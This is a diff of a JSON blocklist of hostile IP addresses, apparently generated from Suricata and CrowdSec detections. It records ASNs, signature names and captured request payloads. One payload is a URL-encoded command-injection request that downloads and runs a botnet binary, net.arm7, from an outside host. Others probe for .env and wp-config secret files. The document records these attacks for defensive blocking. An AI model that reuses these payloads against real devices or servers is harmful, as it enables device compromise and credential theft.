@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-10-15T01:00:00Z",
+  "generated_at": "2026-10-15T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 1287,
-    "v4": 1287,
+    "total": 1291,
+    "v4": 1291,
     "v6": 0
   },
   "items": [
@@ -771,8 +771,9 @@
       "ip": "130.12.180.32",
       "family": "v4",
       "first_seen": "2026-10-12T21:00:00Z",
-      "last_seen": "2026-10-13T21:00:00Z",
+      "last_seen": "2026-10-15T08:00:00Z",
       "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 4",
         "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 5"
       ],
       "sources": [
@@ -21026,6 +21027,89 @@
       "asn_prefix": "160.119.64.0/22",
       "payloads": [
         "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3Brm%20net.arm7%3B%20wget%20http%3A%2F%2F160.119.66.206%2Fbins%2Fnet.arm7%3B%20chmod%20777%20%2A%3B%20.%2Fnet.arm7%20tbk"
+      ]
+    },
+    {
+      "ip": "34.22.106.197",
+      "family": "v4",
+      "first_seen": "2026-10-15T09:00:00Z",
+      "last_seen": "2026-10-15T09:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files",
+        "suricata/ET WEB_SERVER Tilde in URI - potential .php~ source disclosure vulnerability"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.22.96.0/20",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /.env",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env.staging",
+        "GET /.env.development",
+        "GET /.env.backup",
+        "GET /.env.bak",
+        "GET /.env.old",
+        "GET /.env.swp",
+        "GET /.env.save",
+        "GET /.env.dist",
+        "GET /wp-config.php~"
+      ]
+    },
+    {
+      "ip": "59.103.104.52",
+      "family": "v4",
+      "first_seen": "2026-10-15T07:00:00Z",
+      "last_seen": "2026-10-15T07:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER WGET Command Specifying Output in HTTP Headers"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "59.103.104.0/24",
+      "payloads": [
+        "POST /HNAP1/"
+      ]
+    },
+    {
+      "ip": "27.17.76.174",
+      "family": "v4",
+      "first_seen": "2026-10-15T06:00:00Z",
+      "last_seen": "2026-10-15T06:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ]
+    },
+    {
+      "ip": "46.101.53.114",
+      "family": "v4",
+      "first_seen": "2026-10-15T03:00:00Z",
+      "last_seen": "2026-10-15T03:00:00Z",
+      "scenarios": [
+        "suricata/ET WEB_SERVER Possible SQL Injection SELECT CONCAT in HTTP Request Body"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "46.101.0.0/18",
+      "payloads": [
+        "POST /wp-json/batch/v1"
       ]
     }
   ]
